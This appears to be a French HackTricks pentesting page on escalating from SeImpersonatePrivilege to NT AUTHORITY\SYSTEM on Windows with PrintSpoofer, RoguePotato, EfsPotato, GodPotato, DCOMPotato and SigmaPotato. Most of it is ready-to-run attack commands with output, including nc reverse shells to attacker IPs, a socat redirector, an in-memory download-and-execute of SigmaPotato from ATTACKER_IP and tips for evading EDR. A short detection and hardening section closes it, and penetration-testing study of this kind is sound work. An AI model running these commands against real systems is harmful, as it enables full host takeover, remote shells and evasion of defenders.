# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne fonctionne pas** sur Windows Server 2019 et Windows 10 build 1809 et versions ultérieures. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** peuvent être utilisés pour obtenir les mêmes privilèges et atteindre un accès de niveau `NT AUTHORITY\SYSTEM`. Ce [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) approfondit l'outil `PrintSpoofer`, qui peut être utilisé pour abuser des privilèges d'impersonation sur des hôtes Windows 10 et Server 2019 où JuicyPotato ne fonctionne plus.

> [!TIP]
> Une alternative moderne fréquemment maintenue en 2024–2025 est SigmaPotato (un fork de GodPotato) qui ajoute l'usage en mémoire/.NET reflection et un support OS étendu. Voir l'utilisation rapide ci-dessous et le repo dans References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Prérequis et pièges courants

Toutes les techniques suivantes reposent sur l'abus d'un service privilégié capable d'impersonation depuis un contexte disposant de l'un des privilèges suivants :

- SeImpersonatePrivilege (le plus courant) ou SeAssignPrimaryTokenPrivilege
- Une intégrité élevée n'est pas requise si le token possède déjà SeImpersonatePrivilege (typique pour de nombreux comptes de service tels que IIS AppPool, MSSQL, etc.)

Vérifiez rapidement les privilèges :
```cmd
whoami /priv | findstr /i impersonate
```
Remarques opérationnelles:

- PrintSpoofer nécessite que le service Print Spooler soit en cours d'exécution et accessible via le endpoint RPC local (spoolss). Dans les environnements durcis où Spooler est désactivé après PrintNightmare, privilégiez RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiert un OXID resolver accessible sur TCP/135. Si l’egress est bloqué, utilisez un redirector/port-forwarder (voir exemple ci-dessous). Les versions plus anciennes nécessitaient le flag -f.
- EfsPotato/SharpEfsPotato exploitent MS-EFSR ; si un pipe est bloqué, essayez des pipes alternatifs (lsarpc, efsrpc, samr, lsass, netlogon).
- L'erreur 0x6d3 lors de RpcBindingSetAuthInfo indique généralement un service d'authentification RPC inconnu/non supporté ; essayez un autre pipe/transport ou assurez-vous que le service cible est en cours d'exécution.

## Démo rapide

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Remarques :
- Vous pouvez utiliser -i pour lancer un processus interactif dans la console actuelle, ou -c pour exécuter un one-liner.
- Requiert le service Spooler. Si désactivé, cela échouera.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si les connexions sortantes sur le port 135 sont bloquées, pivotez le résolveur OXID via socat sur votre redirector :
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Conseil : Si un pipe échoue ou si l'EDR le bloque, essayez les autres pipes pris en charge :
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Remarques:
- Fonctionne sur Windows 8/8.1–11 et Server 2012–2022 lorsque SeImpersonatePrivilege est présent.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fournit deux variantes ciblant les objets DCOM de service qui sont par défaut RPC_C_IMP_LEVEL_IMPERSONATE. Compilez ou utilisez les binaries fournis et exécutez votre commande :
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (mis à jour GodPotato fork)

SigmaPotato ajoute des fonctionnalités modernes, comme l'exécution en mémoire via .NET reflection et un helper pour PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Notes de détection et de durcissement

- Surveiller les processus créant des named pipes et appelant immédiatement des token-duplication APIs suivis de CreateProcessAsUser/CreateProcessWithTokenW. Sysmon peut fournir une télémétrie utile : Event ID 1 (process creation), 17/18 (named pipe created/connected), et les lignes de commande lançant des processus enfants en tant que SYSTEM.
- Durcissement du spooler : désactiver le service Print Spooler sur les serveurs où il n’est pas nécessaire empêche les coercitions locales de type PrintSpoofer via spoolss.
- Durcissement des comptes de service : minimiser l’attribution de SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege aux services personnalisés. Envisager d’exécuter les services sous des comptes virtuels avec les privilèges minimaux requis et de les isoler avec service SID et des write-restricted tokens quand c’est possible.
- Contrôles réseau : bloquer le trafic sortant TCP/135 ou restreindre le trafic du RPC endpoint mapper peut casser RoguePotato sauf si un redirecteur interne est disponible.
- EDR/AV : tous ces outils sont largement signaturés. Recompiler depuis les sources, renommer les symboles/chaînes ou utiliser une exécution en mémoire peut réduire la détection mais ne vaincra pas des détections comportementales robustes.

## Références

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
